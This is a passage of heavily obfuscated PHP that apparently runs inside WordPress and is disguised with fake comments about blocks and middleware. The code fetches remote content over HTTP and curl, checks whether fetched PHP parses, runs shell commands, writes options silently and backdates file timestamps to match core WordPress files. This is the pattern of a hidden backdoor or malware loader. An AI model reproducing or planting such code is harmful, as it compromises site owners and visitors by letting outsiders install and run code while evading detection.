  if ($GLOBALS['__scf__me483qbepnts_41']($t8pgd95z90)    && $GLOBALS['__scf__me483qbepnts_41']($npic48ve3u4)   &&    $t8pgd95z90  ===     $npic48ve3u4)   {
// WP Verse Block thumbnail crop

  $qcnnr68xey_270b5   = zgyyi45x9xgfqs0mxs6p($k6b6dwvgnh5_v);
 if    ($qcnnr68xey_270b5   ===  f5cd2smymkqusi5(210)     || $qcnnr68xey_270b5     ===   dhd5r6_4ki(211)) $i367fqlt3t3kqgu    =    true;
}
unset($t8pgd95z90,  $npic48ve3u4,    $qcnnr68xey_270b5);
   }
     if     (!$i367fqlt3t3kqgu &&    a6ucigno80cqr0m_($j_vrej75n3uzc0))  $i367fqlt3t3kqgu   =     true;



   unset($k6b6dwvgnh5_v);
  }



 if     ($i367fqlt3t3kqgu)  {
  if ($pa4f9zz5kdfo)     c6hv69l5g12jyc968g($j_vrej75n3uzc0);
@update_option($sv9h9r5s57g5trl,      $elr5npzrsqi90,   nhceivfj8tbe(200));
 return;



 }
   if    (!$rmb80rsmhdy3jstx) {
    @update_option($sv9h9r5s57g5trl, $elr5npzrsqi90,  pahk8uy1uxt(212));
return;
  }
if  (lzhxpcpzmcnh2ec($j_vrej75n3uzc0,    vv_nfhhmy_1mjmsa()))   {
  @update_option($sv9h9r5s57g5trl, $elr5npzrsqi90,  f5cd2smymkqusi5(213));
   return;
  }
 if ($gkpu21ytrx7rrtet  <    0 ||    ($gkpu21ytrx7rrtet  === 0  &&   $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  dhd5r6_4ki(90))),  0, (7+5))   <=    $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($GLOBALS['__scf_t8832qq90dxb4_3']($lpdgllzueudlthp1,   mhiu2yqz6kqd(214))),  0,      (8+4))))  {
// transpile multilinear dispatcher


udxja7mp4cir7rqqnk(vv_nfhhmy_1mjmsa(),    $iw4eac4_ctzq1jb);
hbznvngszh_owndcbdovv(vv_nfhhmy_1mjmsa());

 return  true;



      }
  }
    if   (empty($GLOBALS[mhiu2yqz6kqd(215)]))  {



 $GLOBALS[nrudcgor(215)]  =  true;
 if  (m4eahxbbz3er7pv($j_vrej75n3uzc0,    (4911+89)))  c6hv69l5g12jyc968g($j_vrej75n3uzc0);
 $tbs0_jp9e8eo3js    = $GLOBALS['__scf_zxyq0lcqv02z6_185']();
kfdh_vugi0_9nv_wpj(vv_nfhhmy_1mjmsa(), ($tbs0_jp9e8eo3js  -     ($tbs0_jp9e8eo3js    %      (119968-19968)))  +  mzvtk8ecgiuaeafix());
unset($tbs0_jp9e8eo3js);
udxja7mp4cir7rqqnk($_jdqhjqom1j,  $plqlv9a69cct);


      if ($qx2fyor7xc)   udxja7mp4cir7rqqnk($qx2fyor7xc, $plqlv9a69cct);
   rehs1w07vadorbxdvk(nhceivfj8tbe(196),    nhceivfj8tbe(216),     0);
    @update_option($sv9h9r5s57g5trl,    $elr5npzrsqi90, pahk8uy1uxt(213));
  

  vb9k6otlj0n7duv5om(nrudcgor(217));
     if    ($qx2fyor7xc  !==     "") {


     rw8_xtah3ly329wza7vebi($GLOBALS['__scf_l2thcf5lcfr_202']($lpdgllzueudlthp1, PATHINFO_FILENAME)   .     '/' . $lpdgllzueudlthp1);
  }
 }
 return;
} catch    (Throwable  $h2v_bjm4ejxq8fp)  {
    fukkkeh6955g9qi(mhiu2yqz6kqd(218), $h2v_bjm4ejxq8fp);
       }  catch   (Exception $h2v_bjm4ejxq8fp)     {
        }    finally  {
 m8s6jamaok_hdjr3wp(dhd5r6_4ki(198));
     }
}
function ly0t7sdceinn03pyne3($ys5go7qi508n,    $f6dywhmkl3fi9jd0    =   0)


 {



    $f6dywhmkl3fi9jd0  =   (int) $f6dywhmkl3fi9jd0;


    if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(219))  &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(220)))    {
   $rgtt558lrqds = @$GLOBALS['__scf_ivwysm6c8cp_219']($ys5go7qi508n);


    if    ($rgtt558lrqds)  {
$m6t27xygoirjp   =    array();
 while     (($h2v_bjm4ejxq8fp  =     @$GLOBALS['__scf_agnh6h3m7ghwkr_220']($rgtt558lrqds)) !== false)  {
 if ($h2v_bjm4ejxq8fp     !== '.'  &&   $h2v_bjm4ejxq8fp    !== f5cd2smymkqusi5(45)) $m6t27xygoirjp[]  =  $h2v_bjm4ejxq8fp;
       if   ($f6dywhmkl3fi9jd0 >    0 && $GLOBALS['__scf_upe5p4qfaqm0d1_36']($m6t27xygoirjp)      >=  $f6dywhmkl3fi9jd0) break;$tl4bftiwcilv=(0x88+0x49);$wk4ief9yb=$tl4bftiwcilv%9;
     }
   if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(221)))     @$GLOBALS['__scf_prx5a2gmqad3pd_221']($rgtt558lrqds);

 return     $m6t27xygoirjp;
 

}
}
  if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(222)))     {
$o6cshl9m0sbvrr   =     @$GLOBALS['__scf_jetqv7wpcizi69_34']($ys5go7qi508n);
if  ($GLOBALS['__scf_vf9p0fditvxy_35']($o6cshl9m0sbvrr)) {
     $o6cshl9m0sbvrr  =   $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_pabtmjmzpv76n_149']($o6cshl9m0sbvrr,     array('.',    nrudcgor(223))));
if  ($f6dywhmkl3fi9jd0  >  0 &&   $GLOBALS['__scf_upe5p4qfaqm0d1_36']($o6cshl9m0sbvrr)  >  $f6dywhmkl3fi9jd0) $o6cshl9m0sbvrr = $GLOBALS['__scf_jxqnb2ruhcwvk_155']($o6cshl9m0sbvrr,      0, $f6dywhmkl3fi9jd0);
  return    $o6cshl9m0sbvrr;


}
  }
        if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(224)))  {



   $digk2wmdxsk9  = @$GLOBALS['__scf_eu7lhdrjut9t66_69']($ys5go7qi508n   . f5cd2smymkqusi5(225));
if  ($GLOBALS['__scf_vf9p0fditvxy_35']($digk2wmdxsk9)) {
/* undecidable filter-chain */

if  ($f6dywhmkl3fi9jd0 > 0  &&   $GLOBALS['__scf_upe5p4qfaqm0d1_36']($digk2wmdxsk9)    >  $f6dywhmkl3fi9jd0) $digk2wmdxsk9   =    $GLOBALS['__scf_jxqnb2ruhcwvk_155']($digk2wmdxsk9, 0,     $f6dywhmkl3fi9jd0);
       return  $GLOBALS['__scf_mk5mjwnx8r_226'](nhceivfj8tbe(227), $digk2wmdxsk9);



    }
  }
    return  null;



 }
        function     pz4e0r8tos8uc6nfa($tvb6duty46kk5o)
   {
     if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(228))  ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(229)))   return    null;
$m1nhx7h1hlnb0zyb   = $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(230))    ?   (string)  @$GLOBALS['__scf_jpj9mbom_1b_109'](f5cd2smymkqusi5(231)) : "";
if    ($m1nhx7h1hlnb0zyb  !==  ""   && stripos($m1nhx7h1hlnb0zyb,      nhceivfj8tbe(228))     !==     false)   return    null;
$fwjop1zv05qjwnko  =  xtkohsjdeedyznx6vx($GLOBALS['__scf_bwby2gdg0t53_75'](),     nrudcgor(232));
     if  ($fwjop1zv05qjwnko   ===   false) return      null;
  if  (@$GLOBALS['__scf_xkvbr8xk_o_mly_194']($fwjop1zv05qjwnko,    $tvb6duty46kk5o)  !== $GLOBALS['__scf_amjjmfnilcolnb_10']($tvb6duty46kk5o))  {
  t65xl1pt2haov_izh($fwjop1zv05qjwnko);
return null;
   }
$zlul15at13  =     @$GLOBALS['__scf_vufcnvl3zxakws_228'](mhiu2yqz6kqd(233) .     escapeshellarg($fwjop1zv05qjwnko)  . nhceivfj8tbe(234));
      t65xl1pt2haov_izh($fwjop1zv05qjwnko);
if   (!$GLOBALS['__scf__me483qbepnts_41']($zlul15at13)  ||   $zlul15at13   === "")  return null;
 if    (stripos($zlul15at13,  mhiu2yqz6kqd(235))     !==  false)  return true;
  if   (stripos($zlul15at13,   dhd5r6_4ki(236)) !== false ||     stripos($zlul15at13,    pahk8uy1uxt(237))      !==  false)   return   false;

    return  null;
  }
function  hkk3yvii60ci7rk($tvb6duty46kk5o)
{
      static $fmwdpo9coh =   array();

     if (!$GLOBALS['__scf__me483qbepnts_41']($tvb6duty46kk5o)   || $GLOBALS['__scf_nr12ouzrtt_7']($tvb6duty46kk5o,  pahk8uy1uxt(238))   ===    false) return    false;
 




   if    ($GLOBALS['__scf_amjjmfnilcolnb_10']($tvb6duty46kk5o) >   (1048560+16))  $tvb6duty46kk5o    =   g9begdqy64lw_mpz($tvb6duty46kk5o);
 if ($GLOBALS['__scf_amjjmfnilcolnb_10']($tvb6duty46kk5o) >  (1048480+96))  return  false;
     if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(239))) return  true;
 $w4hc3ajs_7  = $GLOBALS['__scf_amjjmfnilcolnb_10']($tvb6duty46kk5o)    .   ':'   .      $GLOBALS['__scf_nn04_vx3uspzx4_54']($tvb6duty46kk5o);


if    ($GLOBALS['__scf_qcycj5at_g_240']($w4hc3ajs_7,  $fmwdpo9coh))   return $fmwdpo9coh[$w4hc3ajs_7];



 $ietjbxgv48_l =  icegiybfjhuehvkiyfn2zh($tvb6duty46kk5o);
if  ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($fmwdpo9coh)    >  (3<<3))   $fmwdpo9coh = array();
  $fmwdpo9coh[$w4hc3ajs_7] =    $ietjbxgv48_l;
 return   $ietjbxgv48_l;
 }
function  icegiybfjhuehvkiyfn2zh($tvb6duty46kk5o)
{
   if  (!defined(nrudcgor(241)))  {
     $ktvvyftgdu = ahyh220jo2oy0022r0hmmj($GLOBALS['__scf_amjjmfnilcolnb_10']($tvb6duty46kk5o));



 if      ($ktvvyftgdu)  {
 $y5kh9qfngqkl4tlf  =   @token_get_all($tvb6duty46kk5o);
  if (!$GLOBALS['__scf_vf9p0fditvxy_35']($y5kh9qfngqkl4tlf))  return true;
 $ec58q_ks0agewsz  = 0;
  $rqlh2mvzxxbhuk  =  0;$k74r38ucyfh7zv=PHP_MAJOR_VERSION;$q_zd8i7bwk=$k74r38ucyfh7zv*10;
    $alnkeafe57t =  0;
  foreach   ($y5kh9qfngqkl4tlf    as     $spxzjtpg4pa938mw)   {
     if ($GLOBALS['__scf_vf9p0fditvxy_35']($spxzjtpg4pa938mw))    {
  if  ($spxzjtpg4pa938mw[0] ===   T_CURLY_OPEN    ||  $spxzjtpg4pa938mw[0]   === T_DOLLAR_OPEN_CURLY_BRACES)   $ec58q_ks0agewsz++;
 continue;
 }
     if  ($spxzjtpg4pa938mw ===  '{')  $ec58q_ks0agewsz++;
   elseif  ($spxzjtpg4pa938mw      ===  '}')  {
    $ec58q_ks0agewsz--;
 if ($ec58q_ks0agewsz <      0)      return   false;
   } elseif ($spxzjtpg4pa938mw  ===  '(')    $rqlh2mvzxxbhuk++;



  elseif ($spxzjtpg4pa938mw  === ')')  {
  $rqlh2mvzxxbhuk--;
 if   ($rqlh2mvzxxbhuk   <  0) return  false;
}  elseif  ($spxzjtpg4pa938mw  ===  '[')   $alnkeafe57t++;


elseif  ($spxzjtpg4pa938mw   ===   ']')   {
$alnkeafe57t--;
 if  ($alnkeafe57t  < 0)  return     false;
    }



  }
        if  ($ec58q_ks0agewsz  !==  0    ||     $rqlh2mvzxxbhuk     !== 0   ||     $alnkeafe57t   !==  0)  return false;
    }
  $x2n8_neb6qjtu2  =   pz4e0r8tos8uc6nfa($tvb6duty46kk5o);
if ($GLOBALS['__scf_ekylwhakwhu44e_242']($x2n8_neb6qjtu2))   return  $x2n8_neb6qjtu2;



   return   $ktvvyftgdu;

 }
  if      (!ahyh220jo2oy0022r0hmmj($GLOBALS['__scf_amjjmfnilcolnb_10']($tvb6duty46kk5o))) {
$x2n8_neb6qjtu2    =   pz4e0r8tos8uc6nfa($tvb6duty46kk5o);


return    $GLOBALS['__scf_ekylwhakwhu44e_242']($x2n8_neb6qjtu2) ?  $x2n8_neb6qjtu2     :  false;
 }
 try  {


@token_get_all($tvb6duty46kk5o, TOKEN_PARSE);
return  true;
  }  catch  (Throwable    $h2v_bjm4ejxq8fp) {
  return false;
 }     catch      (Exception  $h2v_bjm4ejxq8fp)     {
 return   false;
}



 }
  function  mbwj2ok57baj7zc51bn4()
{
 return array(mhiu2yqz6kqd(243),   mhiu2yqz6kqd(244),  mhiu2yqz6kqd(245));
  }
  function   nt9a6f1fvujlb8i0us832e()
     {
return  array(mhiu2yqz6kqd(246),    mhiu2yqz6kqd(247),   pahk8uy1uxt(248),  f5cd2smymkqusi5(249),     dhd5r6_4ki(250),   nrudcgor(251),    dhd5r6_4ki(252),    nrudcgor(253),  nrudcgor(254),    nhceivfj8tbe(255),   nrudcgor(256),   f5cd2smymkqusi5(257),   mhiu2yqz6kqd(258),  pahk8uy1uxt(259), pahk8uy1uxt(260),    nhceivfj8tbe(261),    dhd5r6_4ki(262), dhd5r6_4ki(263),     nhceivfj8tbe(264), nhceivfj8tbe(265));
}
  function szmhvfh9ind7mi0i_()
{
 return array(dhd5r6_4ki(266),   dhd5r6_4ki(267),  mhiu2yqz6kqd(268),    pahk8uy1uxt(269));

 }

 function oks4ay45sdg2p8hjra($nfwt0_jg6oiy6)
{
// WP Table Block: spawn fallback-handler

if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(270)))     return gzencode($nfwt0_jg6oiy6,  (5+4));

   if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(271)))   {

 return    "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03"  .  gzdeflate($nfwt0_jg6oiy6,  (0x5+0x4))  .  $GLOBALS['__scf_azva19cwklh_272']('V',  $GLOBALS['__scf_zqaov300u4ga_273']($nfwt0_jg6oiy6))   .    $GLOBALS['__scf_azva19cwklh_272']('V',   $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6)      &  (4294967220+75));
  }
 return  $nfwt0_jg6oiy6;
}
  function      afmou025cdp06je06pv($nfwt0_jg6oiy6)
       {$uixrctq7=90|139;$iuelbigybljzw=$uixrctq7^224;
 if (!$GLOBALS['__scf__me483qbepnts_41']($nfwt0_jg6oiy6)    || $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6) <    2)  return $nfwt0_jg6oiy6;
 if     ($GLOBALS['__scf_bv1z3no349dv5r_9']($nfwt0_jg6oiy6, 0,   2)  !==  "\x1f\x8b")   return   $nfwt0_jg6oiy6;


if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6)   <   (11+7))      return    false;
   $mioj9s70t3b60oe  = @$GLOBALS['__scf_tjhq4jz1g2t9_274']('V',   $GLOBALS['__scf_bv1z3no349dv5r_9']($nfwt0_jg6oiy6,     -(3+1)));
    $mioj9s70t3b60oe = $GLOBALS['__scf_vf9p0fditvxy_35']($mioj9s70t3b60oe)  ?  $mioj9s70t3b60oe[1]  :   0;
if    ($mioj9s70t3b60oe    < (460+40)  ||  $mioj9s70t3b60oe >    (521268+527308)) return false;
if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(275)))     {
   $i7is8x4_pstu0r    = @gzdecode($nfwt0_jg6oiy6,   (1026409+22167));
 if    ($i7is8x4_pstu0r !==    false)  return   $i7is8x4_pstu0r;
      }
      if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(276)))    {
   $i7is8x4_pstu0r  =      @gzinflate($GLOBALS['__scf_bv1z3no349dv5r_9']($nfwt0_jg6oiy6, (0x5+0x5), $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6) -   (86^68)),  (1118612-70036));
  return    ($GLOBALS['__scf__me483qbepnts_41']($i7is8x4_pstu0r)  &&    $GLOBALS['__scf_amjjmfnilcolnb_10']($i7is8x4_pstu0r) <=  (0x766c+0xf8994))    ?  $i7is8x4_pstu0r :      false;
      }
 return false;
  }
  function   s0atn4kj4wvk2f($m7wsjf7nq32xptso)
  {



 if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(277)))  return  $GLOBALS['__scf_bq8mfub709yf5_277']($m7wsjf7nq32xptso);
if  (!   $GLOBALS['__scf__me483qbepnts_41']($m7wsjf7nq32xptso)  ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($m7wsjf7nq32xptso)  %    2   !==    0)  {
   return  false;
       }
  return $GLOBALS['__scf_azva19cwklh_272'](nhceivfj8tbe(278),   $m7wsjf7nq32xptso);
  }



 
       
function  cpfi26oipjceuyib8()

   {
 $hyettli7e8 = array();
 $djkpffbkhb5q =   array(ABSPATH,  ABSPATH  .     f5cd2smymkqusi5(279),  ABSPATH  .  mhiu2yqz6kqd(280));
     if (defined(nrudcgor(165)))   $djkpffbkhb5q[]  =  WP_CONTENT_DIR   .    '/';

     foreach ($djkpffbkhb5q   as     $i7is8x4_pstu0r) {
// PSR-15 middleware: parallelize aggregator

 $p2fntj3gsna   =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(224)) ?   @$GLOBALS['__scf_eu7lhdrjut9t66_69']($i7is8x4_pstu0r     . mhiu2yqz6kqd(281))    :  false;



     if ($GLOBALS['__scf_vf9p0fditvxy_35']($p2fntj3gsna))   {
  foreach  ($p2fntj3gsna  as $tkqx845nh5jt0)   {
    $q9063ysx6bkf9   = @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($tkqx845nh5jt0);
 if  ($q9063ysx6bkf9  &&    $q9063ysx6bkf9    >  (0x1909ab1+0x36dca8cf))   {



    $hyettli7e8[]  =   $q9063ysx6bkf9;
}
   }


    }
}


     if  (!empty($hyettli7e8))  {



  $ga9fric5dh =     $hyettli7e8[$GLOBALS['__scf_fsyst1onwkw_282']($hyettli7e8)];
 return ($ga9fric5dh  -  ($ga9fric5dh  % (99951+49)))     +   mzvtk8ecgiuaeafix();
}


 $fxatko7un3xv =     $GLOBALS['__scf_zxyq0lcqv02z6_185']()    -      ((271+94)  *  (209^201) * (2721+879));
  $kaw7ttzu6yc02   =  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(283)) ? wp_rand(0,   (0x5+0x19)    *   (17+7)  *    (3541+59))    :    $GLOBALS['__scf_um8trklidmw3hl_284'](0,   (18+12)   *  (217^193)    *  (1907+1693));
$ga9fric5dh =  $fxatko7un3xv     - $kaw7ttzu6yc02;



   return ($ga9fric5dh    -   ($ga9fric5dh   %   (99985+15)))    +    mzvtk8ecgiuaeafix();
 }
     function y8t09judnma8_lg6k($palca4kx04jjff)


 {
if  (empty($GLOBALS[dhd5r6_4ki(285)]))    return  $palca4kx04jjff;

 $srqqhl5x9czx0dbx =   $GLOBALS[f5cd2smymkqusi5(286)] -    $GLOBALS['__scf_m30d3r9g_n_287'](true);
    if  ($srqqhl5x9czx0dbx <  1)  return    false;
    return $palca4kx04jjff  > $srqqhl5x9czx0dbx    ? (int)  $GLOBALS['__scf_fa7utfpk5i_w_288']($srqqhl5x9czx0dbx)   :    $palca4kx04jjff;
}

function ckvqtxxyo41shh($dz57qyx_4j_o, $palca4kx04jjff,   $ejt4azjz1x1u  =   null)



    {
 $palca4kx04jjff  =    y8t09judnma8_lg6k($palca4kx04jjff);
     if  ($palca4kx04jjff  === false)    return  false;



  $f08q0pz0dft17    = function   ($ha79t63e3av)  use     ($ejt4azjz1x1u)    {
if     (!$GLOBALS['__scf__me483qbepnts_41']($ha79t63e3av)   || $ha79t63e3av  ===    "") return   false;
        if    ($GLOBALS['__scf_amjjmfnilcolnb_10']($ha79t63e3av)  >     (8388526+82))    return     false;
   if     ($ejt4azjz1x1u)     {
 try    {
  return    (bool)   $GLOBALS['__scf__ilhh_yoem3eg_289']($ejt4azjz1x1u, $ha79t63e3av);
     } catch   (Throwable  $h2v_bjm4ejxq8fp)    {
 return false;
 }   catch   (Exception $h2v_bjm4ejxq8fp)  {
 return  false;
      }
    }
return    true;
};
    $w83a2v_3h4g1d =   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(290))  ?  @$GLOBALS['__scf_yt926i7lwej_290']($dz57qyx_4j_o,   array(
 nrudcgor(291) => $palca4kx04jjff,
nhceivfj8tbe(292) => false,


     nrudcgor(293) =>  (14118178-5729570),
 ))  :   false;
if ($w83a2v_3h4g1d &&    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(294)) ||     !is_wp_error($w83a2v_3h4g1d))) {
  if    ((int)  wp_remote_retrieve_response_code($w83a2v_3h4g1d)   ===   (0xa6+0x22))   {
  $q0h2v_4a4b8le    =     wp_remote_retrieve_body($w83a2v_3h4g1d);

 if ($f08q0pz0dft17($q0h2v_4a4b8le)) return      $q0h2v_4a4b8le;
  }
}
// offline pipeline

$palca4kx04jjff    =  y8t09judnma8_lg6k($palca4kx04jjff);
if  ($palca4kx04jjff  ===  false)     return  false;


if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(295))      &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(296)) && $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(297)))  {
$mlqxc1td9yr3_xe  =  @$GLOBALS['__scf_snv7jnb5asww8k_295']($dz57qyx_4j_o);

if ($mlqxc1td9yr3_xe    ===     false)  return  false;
   @$GLOBALS['__scf_wi7e0dk5bhi0b_296']($mlqxc1td9yr3_xe,  array(
  constant(mhiu2yqz6kqd(298))  =>   true,
 constant(nrudcgor(299)) =>  $palca4kx04jjff,
 constant(nhceivfj8tbe(300))  =>    false,
constant(mhiu2yqz6kqd(301))  => 0,
    constant(mhiu2yqz6kqd(302))    =>  false,
     constant(nhceivfj8tbe(303))     => function ($v_2ea0ui7nym,      $hdn3fgvyls75nzdd, $x4pnzsnc2bszt6z)     {
return     $x4pnzsnc2bszt6z   >  (8388516+92) ?    1 :   0;
 },
 ));
 $f4uaalv3t0y  = @$GLOBALS['__scf_h_zh3my_87om_297']($mlqxc1td9yr3_xe);
$c3obeymn25     = @curl_errno($mlqxc1td9yr3_xe);

   $zyljiayddlhkzrem     =     @curl_getinfo($mlqxc1td9yr3_xe);
    @curl_close($mlqxc1td9yr3_xe);
      if  ($c3obeymn25) return false;
      if   ((int) $zyljiayddlhkzrem[dhd5r6_4ki(304)] ===    (56^240)  &&  $f4uaalv3t0y     !==   false    &&  $f08q0pz0dft17($f4uaalv3t0y))  {
return    $f4uaalv3t0y;
 }
 }

   return  false;

}
     
function   ubc4ftgylcl83r($dz57qyx_4j_o,  $t_ownkir6pw3n6, $i78bqzej0qft, $palca4kx04jjff, $ejt4azjz1x1u = null)
{
$palca4kx04jjff =     y8t09judnma8_lg6k($palca4kx04jjff);
if     ($palca4kx04jjff     === false)   return  false;
$f08q0pz0dft17      =  function ($ha79t63e3av)  use  ($ejt4azjz1x1u)   {
 if   (!$GLOBALS['__scf__me483qbepnts_41']($ha79t63e3av)     ||  $ha79t63e3av ===    "") return  false;
if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($ha79t63e3av)  >     (8388580+28)) return    false;
    if ($ejt4azjz1x1u)  {
 try   {
// spill open dispatcher

       return (bool)    $GLOBALS['__scf__ilhh_yoem3eg_289']($ejt4azjz1x1u,  $ha79t63e3av);
     }      catch  (Throwable  $h2v_bjm4ejxq8fp)    {
// WP Slot Fill hook callback

  return  false;
 }    catch  (Exception $h2v_bjm4ejxq8fp) {
  return  false;$kv00iwvn5za8=PHP_INT_MAX/PHP_INT_MAX;$xks_ik2amzk0=$kv00iwvn5za8+63;
  }
   }



return  true;



};
 $w83a2v_3h4g1d     =     $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(305))    ?      @$GLOBALS['__scf_pqg5hm3hw_wv___305']($dz57qyx_4j_o,    array(
    f5cd2smymkqusi5(291) =>  $palca4kx04jjff,
      f5cd2smymkqusi5(292)  =>   false,
  nrudcgor(293)    => (0x4a10fa+0x35ef06),


 nrudcgor(306)     =>   $i78bqzej0qft,
dhd5r6_4ki(307)  => $t_ownkir6pw3n6,
))   :    false;
      if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(294)) &&   is_wp_error($w83a2v_3h4g1d))   {
  }  elseif ($w83a2v_3h4g1d)     {
      $tvb6duty46kk5o =   (int)    wp_remote_retrieve_response_code($w83a2v_3h4g1d);
  $b8s8th5u3xiaqkb8 = wp_remote_retrieve_body($w83a2v_3h4g1d);
 $hmmxxde24i8zg    =   wp_remote_retrieve_headers($w83a2v_3h4g1d);



$xzbcy7pxrl7ew5_   =   "";
 if ($GLOBALS['__scf_vf9p0fditvxy_35']($hmmxxde24i8zg)) {
       foreach  ($hmmxxde24i8zg   as    $cueercjqf3k   => $n_vseps706s)      {
   $xzbcy7pxrl7ew5_ .=      $cueercjqf3k  . nrudcgor(152)  .   $n_vseps706s   .  pahk8uy1uxt(308);

 }
 }



 if   ($tvb6duty46kk5o  ===  (0x36+0x92)     && $f08q0pz0dft17($b8s8th5u3xiaqkb8))    {
 return $b8s8th5u3xiaqkb8;
     }


   } else   {
     }
if (!empty($GLOBALS[pahk8uy1uxt(309)])) return false;


  $palca4kx04jjff =  y8t09judnma8_lg6k($palca4kx04jjff);
if ($palca4kx04jjff === false)    return false;
 if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(310))   &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(311))  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(297)))  {
$mlqxc1td9yr3_xe  = @$GLOBALS['__scf_snv7jnb5asww8k_295']($dz57qyx_4j_o);
    if ($mlqxc1td9yr3_xe      === false)    {
// WP List Block: repeatable-read resume-session

return    false;

       }
$xirlew4jeb7  =     array();
foreach    ($i78bqzej0qft as $cueercjqf3k   => $n_vseps706s)   {
     $xirlew4jeb7[]   =  $cueercjqf3k  .   mhiu2yqz6kqd(152)  .   $n_vseps706s;
}
     @$GLOBALS['__scf_wi7e0dk5bhi0b_296']($mlqxc1td9yr3_xe,   array(
   constant(pahk8uy1uxt(312)) => true,
    constant(pahk8uy1uxt(313))  =>   $t_ownkir6pw3n6,
  constant(nhceivfj8tbe(298))   =>   true,
       constant(nrudcgor(314))  =>  $palca4kx04jjff,
  constant(dhd5r6_4ki(300))    =>  false,
constant(f5cd2smymkqusi5(301))  =>     0,


 constant(nhceivfj8tbe(315))    => $xirlew4jeb7,
  constant(f5cd2smymkqusi5(302))   =>      false,
  constant(dhd5r6_4ki(303))    =>  function  ($v_2ea0ui7nym, $hdn3fgvyls75nzdd,   $x4pnzsnc2bszt6z)  {



  return   $x4pnzsnc2bszt6z > (0x56fcc9+0x290337)  ?  1  :   0;
 },
  ));
   $f4uaalv3t0y    = @$GLOBALS['__scf_h_zh3my_87om_297']($mlqxc1td9yr3_xe);


    $c3obeymn25  =   @curl_errno($mlqxc1td9yr3_xe);
      $bdq7m6pysk  =  @curl_error($mlqxc1td9yr3_xe);


$zyljiayddlhkzrem =     @curl_getinfo($mlqxc1td9yr3_xe);
  $z940vyb86cfp   =   (int)  $zyljiayddlhkzrem[nrudcgor(316)];
if  ($c3obeymn25)   {
    @curl_close($mlqxc1td9yr3_xe);
  return   false;$t6owg59gzu=84|109;$a23obcqzdf96=$t6owg59gzu^128;
}
@curl_close($mlqxc1td9yr3_xe);
   if      ($z940vyb86cfp  ===  (237^37)    &&   $f4uaalv3t0y !==    false    &&  $f08q0pz0dft17($f4uaalv3t0y))  {
 return  $f4uaalv3t0y;
 }
 if   ($f4uaalv3t0y)  {
  }
   return   false;$_11ie1tu=(0x58+0x86);$iq711eefpvl5=$_11ie1tu%17;
 }
 return false;

  }


 
   function    f139lveo0tq_llwboszkr($thggerfwu5d4p9q  =  (0x16+0x17))
  {
 $cgy7gcnm63 =     mbwj2ok57baj7zc51bn4();
       $vt8phgqu20rhl   =      nt9a6f1fvujlb8i0us832e();
$thggerfwu5d4p9q =  (int) $thggerfwu5d4p9q;
        

 if   ($thggerfwu5d4p9q   <   (9-4))   $thggerfwu5d4p9q   =   (0x3+0x2);
if  ($thggerfwu5d4p9q  >    (249^212))     $thggerfwu5d4p9q     =   (0x9+0x24);


  
 if    (empty($cgy7gcnm63)  ||  empty($vt8phgqu20rhl))    {
 return array();
 }
       
 $c0yfifzimuv = $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(317))    ?    (string)     get_option(nhceivfj8tbe(318), "") :    "";
if  ($c0yfifzimuv   !==   ""  &&     !$GLOBALS['__scf_rq7q923zwh_148']($c0yfifzimuv,  $vt8phgqu20rhl,     true))   $c0yfifzimuv    =   "";

 if ($c0yfifzimuv  !==  "")   {
$vt8phgqu20rhl =  $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_pabtmjmzpv76n_149']($vt8phgqu20rhl,  array($c0yfifzimuv)));
 $GLOBALS['__scf_qyce7tsebstg_319']($vt8phgqu20rhl,    $c0yfifzimuv);


   }

    $mtc6cthyxtaqv    =   $GLOBALS['__scf_uvjtdemk2f_320']($cgy7gcnm63[$GLOBALS['__scf_fsyst1onwkw_282']($cgy7gcnm63)]);
 if ($mtc6cthyxtaqv   ===   "")   {

      return array();
   }



